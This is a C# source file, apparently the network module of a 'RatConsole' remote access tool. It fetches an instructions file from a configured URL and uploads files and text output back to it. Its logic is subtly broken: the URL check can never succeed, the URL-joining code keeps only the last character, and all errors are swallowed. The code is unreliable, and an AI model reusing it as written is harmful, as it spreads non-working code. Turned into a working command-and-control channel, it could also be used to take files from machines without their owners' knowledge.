using System;
using System.Net;

using Bau.Libraries.LibCommonHelper.Extensors;
using Bau.Libraries.LibCommonHelper.Files;

namespace RatConsole.Controllers
{
	/// <summary>
	///		Manager para descarga y subida de archivos por HTTP
	/// </summary>
	public class WebManager
	{
		public WebManager(ProgramManager manager)
		{
			Manager = manager;
		}

		/// <summary>
		///		Descarga el archivo de instrucciones
		/// </summary>
		public void DownloadInstructions(string fileName)
		{
			if (!IsUrl(Manager.UrlDownload))
				CopyFile(GetFileName("Instructions.test.xml", false), fileName);
			else
				DownloadFile(CombineUrl(Manager.UrlDownload, "Instructions.xml").GetUrl(), fileName);
		}

		/// <summary>
		///		Obtiene un nombre de archivo
		/// </summary>
		private string GetFileName(string file, bool consecutive)
		{
			string path = Manager.UrlDownload;

				// Obtiene el directorio
				if (string.IsNullOrEmpty(path) || !System.IO.Directory.Exists(path))
					path = Manager.PathBase;
				// Obtiene el nombre de archivo
				if (consecutive)
					return HelperFiles.GetConsecutiveFileName(path, file);
				else
					return System.IO.Path.Combine(path, file);
		}

		/// <summary>
		///		Comprueba si una cadena identifica una URL
		/// </summary>
		private bool IsUrl(string url)
		{
			return string.IsNullOrEmpty(url) && (url.StartsWith("http://", StringComparison.CurrentCultureIgnoreCase) || 
												 url.StartsWith("https://", StringComparison.CurrentCultureIgnoreCase));
		}

		/// <summary>
		///		Combina una URL con un nombre de archivo
		/// </summary>
		private string CombineUrl(string url, string suffix)
		{
			// Quita las barras finales
			while (!string.IsNullOrEmpty(url) && url.EndsWith("/"))
				url = url.Substring(url.Length - 1);
			// Quita las barras iniciales
			while (!string.IsNullOrEmpty(suffix) && suffix.StartsWith("/"))
				suffix = suffix.Substring(1);
			// Devuelve la URL combinada
			return $"{url}/{suffix}";
		}

		/// <summary>
		///		Copia un archivo
		/// </summary>
		private void CopyFile(string fileSource, string fileTarget)
		{
			HelperFiles.KillFile(fileTarget);
			HelperFiles.CopyFile(fileSource, fileTarget);
		}

		/// <summary>
		///		Descarga un archivo
		/// </summary>
		private void DownloadFile(Uri url, string fileTarget)
		{
			if (url != null)
			{
				WebClient webClient = new WebClient();

					// Elimina el archivo antiguo
					HelperFiles.KillFile(fileTarget);
					// Descarga el archivo
					try
					{
						webClient.DownloadFile(url, fileTarget);
					}
					catch {}
			}
		}

		/// <summary>
		///		Sube un archivo
		/// </summary>
		internal void UploadFile(string fileName)
		{
			if (!IsUrl(Manager.UrlDownload))
				HelperFiles.CopyFile(fileName, GetFileName(System.IO.Path.GetFileName(fileName), true));
			else
				UploadFile(Manager.UrlDownload.GetUrl(), fileName);
		}

		/// <summary>
		///		Sube un texto
		/// </summary>
		internal void UploadText(string text)
		{
			string fileName = GetFileName("output.txt", true);

				// Graba el archivo
				HelperFiles.SaveTextFile(fileName, text);
				// ... y lo sube
				if (IsUrl(Manager.UrlDownload))
				{
					UploadFile(Manager.UrlDownload.GetUrl(), fileName);
					HelperFiles.KillFile(fileName);
				}
		}

		/// <summary>
		///		Sube un archivo
		/// </summary>
		private void UploadFile(Uri url, string fileName)
		{
			try
			{
				new WebClient().UploadFile(url, fileName);
			}
			catch {}
		}

		/// <summary>
		///		Manager de ejecución de instrucciones
		/// </summary>
		private ProgramManager Manager { get; }
	}
}
